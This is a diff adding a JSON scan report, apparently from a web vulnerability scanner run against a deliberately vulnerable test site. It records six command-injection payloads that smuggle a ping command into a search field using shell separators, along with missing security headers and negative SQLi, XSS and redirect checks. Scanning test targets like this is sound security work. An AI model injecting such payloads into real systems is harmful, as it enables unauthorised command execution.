@@ -1,0 +1,125 @@
+[
+    {
+        "cmd_injection": {
+            "vulnerabilities": [
+                {
+                    "data": {
+                        "goButton": "go",
+                        "searchFor": "test; ping -c 1 127.0.0.1"
+                    },
+                    "form_action": "search.php?test=query",
+                    "matched_indicator": "PING",
+                    "method": "POST",
+                    "payload": "test; ping -c 1 127.0.0.1",
+                    "status_code": 200,
+                    "target_url": "http://testphp.vulnweb.com/search.php?test=query"
+                },
+                {
+                    "data": {
+                        "goButton": "go",
+                        "searchFor": "test && ping -c 1 127.0.0.1"
+                    },
+                    "form_action": "search.php?test=query",
+                    "matched_indicator": "PING",
+                    "method": "POST",
+                    "payload": "test && ping -c 1 127.0.0.1",
+                    "status_code": 200,
+                    "target_url": "http://testphp.vulnweb.com/search.php?test=query"
+                },
+                {
+                    "data": {
+                        "goButton": "go",
+                        "searchFor": "test | ping -c 1 127.0.0.1"
+                    },
+                    "form_action": "search.php?test=query",
+                    "matched_indicator": "PING",
+                    "method": "POST",
+                    "payload": "test | ping -c 1 127.0.0.1",
+                    "status_code": 200,
+                    "target_url": "http://testphp.vulnweb.com/search.php?test=query"
+                },
+                {
+                    "data": {
+                        "goButton": "go",
+                        "searchFor": "`ping -c 1 127.0.0.1`"
+                    },
+                    "form_action": "search.php?test=query",
+                    "matched_indicator": "PING",
+                    "method": "POST",
+                    "payload": "`ping -c 1 127.0.0.1`",
+                    "status_code": 200,
+                    "target_url": "http://testphp.vulnweb.com/search.php?test=query"
+                },
+                {
+                    "data": {
+                        "goButton": "go",
+                        "searchFor": "$(ping -c 1 127.0.0.1)"
+                    },
+                    "form_action": "search.php?test=query",
+                    "matched_indicator": "PING",
+                    "method": "POST",
+                    "payload": "$(ping -c 1 127.0.0.1)",
+                    "status_code": 200,
+                    "target_url": "http://testphp.vulnweb.com/search.php?test=query"
+                },
+                {
+                    "data": {
+                        "goButton": "go",
+                        "searchFor": "|| ping -c 1 127.0.0.1"
+                    },
+                    "form_action": "search.php?test=query",
+                    "matched_indicator": "PING",
+                    "method": "POST",
+                    "payload": "|| ping -c 1 127.0.0.1",
+                    "status_code": 200,
+                    "target_url": "http://testphp.vulnweb.com/search.php?test=query"
+                }
+            ],
+            "vulnerable": true
+        },
+        "cookies": [],
+        "errors": [],
+        "forms": [
+            {
+                "action": "search.php?test=query",
+                "inputs": [
+                    {
+                        "name": "searchFor",
+                        "type": "text",
+                        "value": ""
+                    },
+                    {
+                        "name": "goButton",
+                        "type": "submit",
+                        "value": "go"
+                    }
+                ],
+                "method": "post"
+            }
+        ],
+        "headers": {
+            "missing": [
+                "Strict-Transport-Security",
+                "X-Frame-Options",
+                "Content-Security-Policy",
+                "X-Content-Type-Options",
+                "Permissions-Policy",
+                "Referrer-Policy"
+            ],
+            "present": {}
+        },
+        "open_redirect": {
+            "vulnerabilities": [],
+            "vulnerable": false
+        },
+        "sqli": {
+            "vulnerabilities": [],
+            "vulnerable": false
+        },
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "xss": {
+            "reflected": false,
+            "vulnerabilities": []
+        }
+    }
+]
